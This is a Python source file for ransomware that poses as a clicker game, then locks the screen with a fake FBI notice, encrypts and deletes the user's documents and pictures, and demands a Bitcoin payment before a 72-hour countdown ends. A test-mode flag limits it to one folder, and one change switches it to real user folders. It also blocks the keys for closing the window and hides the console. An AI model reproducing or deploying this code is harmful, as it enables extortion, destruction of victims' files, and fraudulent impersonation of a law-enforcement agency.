#!/usr/bin/env python3
"""
FBI RANSOMWARE — REAL DARK DESIGN
Actually looks professional and scary
100% VM-SAFE — Only C:\test_ransom
"""

import os, sys, tkinter as tk, ctypes, hashlib, threading, time, random, winsound
from tkinter import font
from datetime import datetime

# ============================================================
# CONFIG
# ============================================================
TEST_MODE = True
TEST_FOLDER = "C:\\test_ransom"
BTC_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"

CODES = ["FS2FGNFJQI","OX77WHWEV5","FCHZT1L6IX","VX02SQI40G","6PXB85GJJJ",
         "XQHCXUH4TU","B1RQSQ9G2L","HE71R2TKVY","Q1BK76N580","01QEU0DUUE",
         "X1LSHVL0OJ","AW3YSY30V3","ZTE2DDE0X4","ZG29U3VDIC","6FNWN5JIOS",
         "F5EBA6TT08","2UUBJ4X7VN","ISP3G7NRPN","J8L0S6SHEJ","FURZCKKNZX"]
HASHES = [hashlib.sha256(c.encode()).hexdigest() for c in CODES]
TIMER = 72 * 3600

# ============================================================
# ENCRYPTION
# ============================================================
def xor_crypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def gen_key():
    return bytes([random.randint(0,255) for _ in range(32)])

def encrypt_files():
    key = gen_key(); count = 0
    dirs = [TEST_FOLDER] if TEST_MODE else [
        os.path.expanduser('~\\Documents'),
        os.path.expanduser('~\\Desktop'),
        os.path.expanduser('~\\Pictures'),
        os.path.expanduser('~\\Downloads'),
    ]
    exts = ['.txt','.docx','.pdf','.jpg','.png','.zip','.py','.js','.html','.css','.doc','.xls','.ppt']
    for d in dirs:
        if not os.path.exists(d): continue
        for root, _, files in os.walk(d):
            for f in files:
                if any(f.lower().endswith(e) for e in exts):
                    try:
                        p = os.path.join(root, f)
                        with open(p,'rb') as fp: data = fp.read()
                        with open(p+'.locked','wb') as fp: fp.write(xor_crypt(data, key))
                        os.remove(p); count += 1
                    except: pass
    with open(os.environ.get('TEMP','C:\\Temp')+'\\decrypt_key.bin','wb') as f: f.write(key)
    return count, key

def decrypt_files(key):
    count = 0
    dirs = [TEST_FOLDER] if TEST_MODE else [
        os.path.expanduser('~\\Documents'),
        os.path.expanduser('~\\Desktop'),
        os.path.expanduser('~\\Pictures'),
        os.path.expanduser('~\\Downloads'),
    ]
    for d in dirs:
        if not os.path.exists(d): continue
        for root, _, files in os.walk(d):
            for f in files:
                if f.endswith('.locked'):
                    try:
                        p = os.path.join(root, f)
                        with open(p,'rb') as fp: data = fp.read()
                        with open(p[:-7],'wb') as fp: fp.write(xor_crypt(data, key))
                        os.remove(p); count += 1
                    except: pass
    return count

# ============================================================
# GAME BAIT
# ============================================================
class Game:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Clicker")
        self.root.geometry("400x350")
        self.root.configure(bg='#0a0a0a')
        self.root.eval('tk::PlaceWindow . center')
        
        tk.Label(self.root, text="CLICKER", font=('Courier', 32, 'bold'), fg='#00ff00', bg='#0a0a0a').pack(pady=15)
        self.score = 0
        self.lbl = tk.Label(self.root, text="SCORE: 0", font=('Courier', 24), fg='#00ff00', bg='#0a0a0a')
        self.lbl.pack(pady=10)
        tk.Button(self.root, text="CLICK", font=('Courier', 18, 'bold'), bg='#ff0000', fg='white',
                  padx=30, pady=10, command=self.click).pack(pady=15)
        self.root.after(4000, self.switch)
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    def click(self):
        self.score += 1
        self.lbl.config(text=f"SCORE: {self.score}")
    
    def switch(self):
        self.root.destroy()
        FBI().run()
    
    def run(self):
        self.root.mainloop()

# ============================================================
# THE REAL FBI RANSOMWARE — DARK & SCARY
# ============================================================
class FBI:
    def __init__(self):
        self.count, self.key = encrypt_files()
        self.timer = TIMER
        self.unlocked = False
        self.root = tk.Tk()
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg='#000000')
        self.root.overrideredirect(True)
        
        # Block everything
        for key in ['<Control-Alt-Delete>','<Alt-F4>','<Escape>','<Control-Shift-Escape>']:
            self.root.bind(key, lambda e: 'break')
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # === MAIN FRAME ===
        main = tk.Frame(self.root, bg='#000000')
        main.pack(expand=True, fill='both')
        
        # === TOP BANNER ===
        top = tk.Frame(main, bg='#0a0a0a')
        top.pack(fill='x', pady=5)
        tk.Label(top, text="▲ FEDERAL BUREAU OF INVESTIGATION ▲", 
                font=('Courier', 16, 'bold'), fg='#cc0000', bg='#0a0a0a').pack(pady=5)
        tk.Label(top, text="DEPARTMENT OF JUSTICE - WASHINGTON, D.C.",
                font=('Courier', 12), fg='#666666', bg='#0a0a0a').pack()
        
        # === SEAL ===
        tk.Label(main, text="⚡ OFFICIAL GOVERNMENT NOTICE ⚡",
                font=('Courier', 14, 'bold'), fg='#cc9900', bg='#000000').pack(pady=5)
        
        # === SCARY WARNING ===
        self.warn = tk.Label(main, text="🔴 YOUR COMPUTER HAS BEEN LOCKED 🔴",
                             font=('Courier', 42, 'bold'), fg='#ff0000', bg='#000000')
        self.warn.pack(pady=20)
        
        # === SUBTEXT ===
        tk.Label(main, text="THIS SYSTEM HAS BEEN FLAGGED FOR VIOLATION OF FEDERAL LAW",
                font=('Courier', 14), fg='#888888', bg='#000000').pack()
        tk.Label(main, text="18 U.S.C. § 1030 • 18 U.S.C. § 2252A • ARTICLE 1, SECTION 8",
                font=('Courier', 12), fg='#555555', bg='#000000').pack(pady=5)
        
        # === VIOLATION LIST ===
        viol_frame = tk.Frame(main, bg='#0a0a0a', bd=1, relief='solid')
        viol_frame.pack(pady=10, padx=50, fill='x')
        
        tk.Label(viol_frame, text="→ VIOLATIONS DETECTED:", font=('Courier', 13, 'bold'),
                fg='#ff6600', bg='#0a0a0a').pack(anchor='w', padx=15, pady=5)
        
        for v in ["UNAUTHORIZED ACCESS TO GOVERNMENT SYSTEMS",
                  "DISTRIBUTION OF MALICIOUS SOFTWARE",
                  "POSSESSION OF PROHIBITED MATERIALS",
                  "CYBER TERRORISM ACTIVITIES DETECTED",
                  "IDENTITY THEFT AND FRAUD"]:
            tk.Label(viol_frame, text=f"  • {v}", font=('Courier', 11),
                    fg='#ff8844', bg='#0a0a0a').pack(anchor='w', padx=20, pady=2)
        
        # === FINE ===
        tk.Label(main, text="💲 FINE: $200.00 USD (BTC EQUIVALENT) 💲",
                font=('Courier', 28, 'bold'), fg='#ffcc00', bg='#000000').pack(pady=12)
        
        # === BTC ADDRESS ===
        btc_frame = tk.Frame(main, bg='#0a0a0a', bd=1, relief='solid')
        btc_frame.pack(pady=5)
        tk.Label(btc_frame, text=BTC_ADDRESS, font=('Courier', 16),
                fg='#00ff00', bg='#0a0a0a').pack(padx=20, pady=6)
        
        # === INPUT ===
        inf = tk.Frame(main, bg='#000000')
        inf.pack(pady=15)
        tk.Label(inf, text="UNLOCK CODE:", font=('Courier', 16, 'bold'),
                fg='#ffffff', bg='#000000').pack(side=tk.LEFT, padx=10)
        self.entry = tk.Entry(inf, font=('Courier', 16), width=20,
                              bg='#0a0a0a', fg='#00ff00', insertbackground='#00ff00')
        self.entry.pack(side=tk.LEFT, padx=10)
        self.entry.focus_set()
        
        # === BUTTONS ===
        btn_frame = tk.Frame(main, bg='#000000')
        btn_frame.pack(pady=10)
        tk.Button(btn_frame, text="🔓 UNLOCK", font=('Courier', 16, 'bold'),
                  bg='#006600', fg='white', padx=20, pady=5, command=self.unlock).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="📋 COPY ADDRESS", font=('Courier', 12),
                  bg='#003366', fg='white', padx=15, command=self.copy).pack(side=tk.LEFT, padx=5)
        
        # === TIMER ===
        self.timer_lbl = tk.Label(main, text="⏱️ 71:59:59", font=('Courier', 48, 'bold'),
                                   fg='#ff0000', bg='#000000')
        self.timer_lbl.pack(pady=10)
        
        # === FOOTER ===
        tk.Label(main, text=f"⚠️ {self.count} FILES ENCRYPTED",
                font=('Courier', 14, 'bold'), fg='#cc0000', bg='#000000').pack(pady=5)
        tk.Label(main, text="FAILURE TO PAY WITHIN 72 HOURS = PERMANENT DATA LOSS",
                font=('Courier', 12, 'bold'), fg='#ff4444', bg='#000000').pack()
        
        if TEST_MODE:
            tk.Label(main, text="⚠️ TEST MODE — NO REAL FILES HARMED ⚠️",
                    font=('Courier', 14, 'bold'), fg='#00ff00', bg='#000000').pack(pady=5)
        
        tk.Label(main, text="🔐 THIS IS AN OFFICIAL GOVERNMENT NOTICE 🔐",
                font=('Courier', 10, 'bold'), fg='#990000', bg='#000000').pack(pady=5)
        
        # === START THREADS ===
        threading.Thread(target=self.tick, daemon=True).start()
        threading.Thread(target=self.flash, daemon=True).start()
        threading.Thread(target=self.siren, daemon=True).start()
        threading.Thread(target=self.focus, daemon=True).start()
        
        self.root.mainloop()
    
    def copy(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(BTC_ADDRESS)
        messagebox.showinfo("", "Address copied!")
    
    def unlock(self):
        code = self.entry.get().strip().upper()
        if not code:
            messagebox.showerror("", "Enter a code!")
            return
        if hashlib.sha256(code.encode()).hexdigest() in HASHES:
            self.unlocked = True
            c = decrypt_files(self.key)
            for _ in range(5): winsound.Beep(800, 100); time.sleep(0.05)
            winsound.Beep(1200, 300)
            messagebox.showinfo("✅ UNLOCKED", f"Decrypted {c} files!\n\nCode: {code}")
            self.root.destroy()
            sys.exit(0)
        else:
            for _ in range(3): winsound.Beep(200, 200); time.sleep(0.05)
            messagebox.showerror("❌ DENIED", f"Invalid code!\n\nPayment: {BTC_ADDRESS}")
            self.entry.delete(0, tk.END)
            self.entry.focus_set()
    
    def tick(self):
        while self.timer > 0 and not self.unlocked:
            h, m, s = self.timer//3600, (self.timer%3600)//60, self.timer%60
            color = '#ff0000' if self.timer < 3600 else '#ff6600' if self.timer < 21600 else '#ff0000'
            self.timer_lbl.config(text=f"⏱️ {h:02d}:{m:02d}:{s:02d}", fg=color)
            self.timer -= 1
            time.sleep(1)
        if self.timer <= 0 and not self.unlocked:
            self.timer_lbl.config(text="💀 TIME EXPIRED", fg='red')
            try:
                p = os.environ.get('TEMP','C:\\Temp')+'\\decrypt_key.bin'
                if os.path.exists(p): os.remove(p)
            except: pass
            messagebox.showerror("💀", "Key destroyed. Files gone forever.")
    
    def flash(self):
        colors = ['#ff0000','#cc0000','#ff3333','#990000']
        while not self.unlocked:
            for c in colors:
                self.warn.config(fg=c)
                time.sleep(0.15)
    
    def siren(self):
        while not self.unlocked:
            try:
                for f in [600, 800, 1000, 800, 600]:
                    if self.unlocked: break
                    winsound.Beep(f, 80)
                    time.sleep(0.04)
                time.sleep(0.3)
            except: break
    
    def focus(self):
        while not self.unlocked:
            try:
                self.root.focus_force()
                self.entry.focus_set()
            except: pass
            time.sleep(0.5)
    
    def run(self):
        self.root.mainloop()

# ============================================================
# MAIN
# ============================================================
def main():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    print("="*50)
    print("🕹️ Clicker Game")
    print("="*50)
    Game().run()

if __name__ == '__main__':
    main()
